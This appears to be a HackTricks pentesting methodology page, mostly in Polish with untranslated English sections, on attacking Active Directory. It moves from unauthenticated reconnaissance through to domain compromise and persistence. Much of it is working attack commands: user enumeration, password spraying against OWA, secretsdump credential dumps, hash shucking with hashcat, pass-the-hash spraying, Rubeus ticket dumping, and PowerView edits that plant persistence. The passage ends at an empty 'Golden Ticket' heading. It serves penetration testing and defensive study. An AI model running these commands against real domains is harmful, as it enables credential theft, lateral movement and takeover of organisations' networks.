# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** służy jako podstawowa technologia, pozwalająca **administratorom sieci** na efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** i **obiektami** w obrębie sieci. Została zaprojektowana z myślą o skalowalności, umożliwiając organizowanie dużej liczby użytkowników w zarządzalne **grupy** i **podgrupy**, a także kontrolowanie **praw dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domains**, **trees** i **forests**. **Domain** obejmuje zbiór obiektów, takich jak **users** czy **devices**, które współdzielą wspólną bazę danych. **Trees** to grupy tych domen połączone wspólną strukturą, a **forest** reprezentuje zbiór wielu drzew połączonych poprzez **trust relationships**, tworząc najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można wyznaczać konkretne **prawa dostępu** i **prawa komunikacji**.

Kluczowe pojęcia w **Active Directory** obejmują:

1. **Directory** – Przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – Oznacza byty w katalogu, w tym **users**, **groups** czy **shared folders**.
3. **Domain** – Służy jako kontener dla obiektów katalogu; w obrębie **forest** może istnieć wiele domen, z których każda utrzymuje własny zbiór obiektów.
4. **Tree** – Grupa domen współdzielających wspólną domenę root.
5. **Forest** – Najwyższa warstwa struktury organizacyjnej w Active Directory, składająca się z kilku trees z wzajemnymi **trust relationships**.

**Active Directory Domain Services (AD DS)** obejmuje zestaw usług kluczowych dla scentralizowanego zarządzania i komunikacji w sieci. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **users** a **domains**, w tym **authentication** i funkcjami **search**.
2. **Certificate Services** – Nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **digital certificates**.
3. **Lightweight Directory Services** – Wspiera aplikacje korzystające z katalogu poprzez **LDAP protocol**.
4. **Directory Federation Services** – Zapewnia funkcje **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi poprzez regulowanie ich nieautoryzowanej dystrybucji i użycia.
6. **DNS Service** – Kluczowa dla rozwiązywania nazw **domain names**.

Po bardziej szczegółowe wyjaśnienie sprawdź: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Aby nauczyć się, jak **atakować AD**, musisz bardzo dobrze **rozumieć** proces **Kerberos authentication**.\
[**Przeczytaj tę stronę jeśli nadal nie wiesz, jak to działa.**](kerberos-authentication.md)

## Cheat Sheet

Możesz skorzystać z [https://wadcoms.github.io/](https://wadcoms.github.io) aby szybko zobaczyć, jakie polecenia możesz uruchomić do enumeracji/eksploatacji AD.

> [!WARNING]
> Komunikacja Kerberos **wymaga pełnej nazwy kwalifikowanej (FQDN)** do wykonywania działań. Jeśli spróbujesz uzyskać dostęp do maszyny przez adres IP, **zostanie użyty NTLM, a nie Kerberos**.

## Recon Active Directory (Brak poświadczeń/sesji)

Jeśli masz dostęp do środowiska AD, ale nie posiadasz żadnych poświadczeń/sesji, możesz:

- **Pentest the network:**
- Skanuj sieć, znajdź maszyny i otwarte porty i spróbuj **eksploatować podatności** lub **wyciągać poświadczenia** z nich (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak web, printers, shares, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zerknij na ogólną [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) aby znaleźć więcej informacji jak to robić.
- **Sprawdź dostęp null i Guest na usługach smb** (to nie zadziała na nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy poradnik jak enumerować serwer SMB można znaleźć tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy poradnik jak enumerować LDAP można znaleźć tutaj (zwróć **szczególną uwagę na anonimowy dostęp**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Zbieraj poświadczenia, **podszywając się pod usługi z Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta przez **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj poświadczenia **eksponując fałszywe usługi UPnP z evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wydobądź nazwy użytkowników/imię i nazwisko z dokumentów wewnętrznych, social media, usług (głównie web) w obrębie środowiska domeny oraz z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz spróbować różnych konwencji tworzenia nazw użytkowników w AD (**przeczytaj to**(https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonymous SMB/LDAP enum:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) oraz [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy zostanie podany **nieprawidłowy username**, serwer odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala nam stwierdzić, że username jest nieprawidłowy. **Prawidłowe nazwy użytkowników** wywołają albo **TGT w odpowiedzi AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-autoryzację.
- **No Authentication against MS-NRPC**: Użycie auth-level = 1 (No authentication) przeciwko interfejsowi MS-NRPC (Netlogon) na domain controllerach. Metoda wywołuje funkcję `DsrGetDcNameEx2` po związaniu interfejsu MS-NRPC, aby sprawdzić, czy user lub computer istnieje bez żadnych poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje tego typu enumerację. Badania można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeżeli znajdziesz taki serwer w sieci, możesz również przeprowadzić **user enumeration against it**. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Możesz znaleźć listy nazw użytkowników w [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak powinieneś mieć **imiona i nazwiska osób pracujących w firmie** z etapu recon, który powinieneś wykonać wcześniej. Mając imię i nazwisko możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnych prawidłowych nazw użytkowników.

### Knowing one or several usernames

OK — masz już prawidłową nazwę użytkownika, ale nie znasz hasła... Spróbuj wtedy:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_ możesz **request a AS_REP message** dla tego użytkownika, która będzie zawierać dane zaszyfrowane pochodną hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbuj najbardziej **common passwords** dla każdego z odkrytych użytkowników — może któryś używa słabego hasła (pamiętaj o polityce haseł!).
- Zauważ, że możesz także **spray OWA servers** aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie uzyskać pewne challenge **hashes** do złamania poprzez **poisoning** niektórych protokołów sieci:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Jeśli udało ci się zenumerować Active Directory, będziesz mieć **więcej adresów e-mail i lepsze zrozumienie sieci**. Być może będziesz w stanie wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) aby uzyskać dostęp do środowiska AD.

### NetExec workspace-driven recon & relay posture checks

- Użyj **`nxcdb` workspaces** aby przechować stan rekonesansu AD dla danego engagementu: `workspace create <name>` tworzy per-protocol SQLite DBs w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki za pomocą `proto smb|mssql|winrm` i wyświetl zgromadzone sekrety poleceniem `creds`. Ręcznie usuń wrażliwe dane po zakończeniu: `rm -rf ~/.nxc/workspaces/<name>`.
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domain**, **OS build**, **SMB signing requirements**, oraz **Null Auth**. Hosty pokazujące `(signing:False)` są **relay-prone**, podczas gdy DC często wymagają podpisywania.
- Generuj **hostnames in /etc/hosts** bezpośrednio z outputu NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay to the DC is blocked** przez signing, nadal badaj stan **LDAP**: `netexec ldap <dc>` pokazuje `(signing:None)` / weak channel binding. DC z wymaganym SMB signing, ale wyłączonym LDAP signing pozostaje wykonalnym celem **relay-to-LDAP** do nadużyć takich jak **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs czasami **embed masked admin passwords in HTML**. Viewing source/devtools może ujawnić cleartext (np. `<input value="<password>">`), umożliwiając Basic-auth dostęp do scan/print repositories.
- Pobrane print jobs mogą zawierać **plaintext onboarding docs** z per-user passwords. Utrzymaj dopasowania par podczas testów:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Ukradnij NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Użyj `secretsdump.py` z opcją history, aby pobrać możliwie największy zestaw NT hashes (i ich poprzednie wartości):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- Możesz użyć [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz także użyć [**powershell for recon**](../basic-powershell-for-pentesters/index.html), co będzie mniej wykrywalne
- Możesz też użyć [**use powerview**](../basic-powershell-for-pentesters/powerview.md) aby uzyskać bardziej szczegółowe informacje
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Teraz, gdy masz kilka podstawowych poświadczeń powinieneś sprawdzić, czy możesz **znaleźć** jakieś **interesujące pliki udostępnione w AD**. Możesz to robić ręcznie, ale to bardzo nudne, powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby dowiedzieć się o narzędziach, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** możesz **umieścić pliki** (np. plik SCF), które jeśli zostaną w jakiś sposób otwarte, spowodują wywołanie **NTLM authentication** wobec ciebie, dzięki czemu możesz **przechwycić** **NTLM challenge** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność pozwalała każdemu uwierzytelnionemu użytkownikowi **przejąć kontrolę nad kontrolerem domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Miejmy nadzieję, że udało ci się **skompromisować konto lokalnego administratora** używając [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) łącznie z relayingiem, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Następnie czas zrzucić wszystkie hashe z pamięci i lokalnie.\
[**Przeczytaj tę stronę o różnych sposobach pozyskania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Musisz użyć jakiegoś **tool**, które wykona **NTLM authentication using** tego **hasha**, **or** możesz utworzyć nowe **sessionlogon** i **inject** ten **hash** do **LSASS**, tak że gdy wykonywane będzie jakiekolwiek **NTLM authentication**, ten **hash zostanie użyty.** Ostatnia opcja to to, co robi mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Zwróć uwagę, że to jest dość **hałaśliwe** i **LAPS** by to **złagodził**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **dostępu do instancji MSSQL**, może wykorzystać je do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **wykradać** NetNTLM **hash** lub nawet przeprowadzić **relay attack**.\
Również, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL — jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania, aby wykonywać zapytania także w tej drugiej instancji**. Te zaufania można łańcuchować i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, gdzie będzie mógł wykonać polecenia.\
**Połączenia między bazami danych działają nawet przez forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Zewnętrzne suite do inwentaryzacji i deploymentu często ujawniają potężne drogi do uzyskania poświadczeń i wykonania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić TGT z pamięci każdego użytkownika, który się na nim loguje.\
Tak więc, jeśli **Domain Admin** zaloguje się na komputer, będziesz w stanie zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie skompromitować Print Server** (oby to był DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma uprawnienie do "Constrained Delegation", będzie mógł **podszywać się pod dowolnego użytkownika, aby uzyskać dostęp do pewnych usług na komputerze**.\
Jeśli więc **skomplikujesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet domain admins) by uzyskać dostęp do niektórych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** na obiekcie Active Directory zdalnego komputera umożliwia osiągnięcie wykonania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Skompromitowany użytkownik może mieć pewne **interesujące uprawnienia do niektórych obiektów domenowych**, które pozwolą mu później **przemieszczać się lateralnie/eskalować uprawnienia**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Odkrycie **usługi Spool nasłuchującej** w domenie może zostać **nadużyte** do **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Jeśli **inni użytkownicy** **dostępają** do **skompro-mitowanego** komputera, możliwe jest **zbieranie poświadczeń z pamięci** i nawet **wstrzykiwanie beaconów do ich procesów**, by się pod nich podszyć.\
Zazwyczaj użytkownicy łączą się przez RDP, więc oto jak wykonać kilka ataków na sesje RDP stron trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach dołączonych do domeny, gwarantując, że jest ono **losowe**, unikalne i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich kontrolowany jest przez ACL-e przypisane tylko do uprawnionych użytkowników. Mając wystarczające uprawnienia do odczytu tych haseł, możliwe jest przemieszczanie się na inne komputery.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zebranie certyfikatów** z zaatakowanej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Jeśli skonfigurowane są **podatne template'y**, można je nadużyć do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Gdy uzyskasz uprawnienia **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **zrzucić** **bazę domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync można znaleźć tutaj**](dcsync.md).

[**Więcej informacji o tym, jak ukraść NTDS.dit, można znaleźć tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z technik omówionych wcześniej mogą być użyte do utrzymania persistence.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Przyznać użytkownikowi uprawnienia [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Atak **Silver Ticket** tworzy **legalny Ticket Granting Service (TGS) ticket** dla konkretnej usługi, używając **NTLM hash** (na przykład **hashu konta komputera**). Metoda ta służy do **uzyskania uprawnień dostępu do danej usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

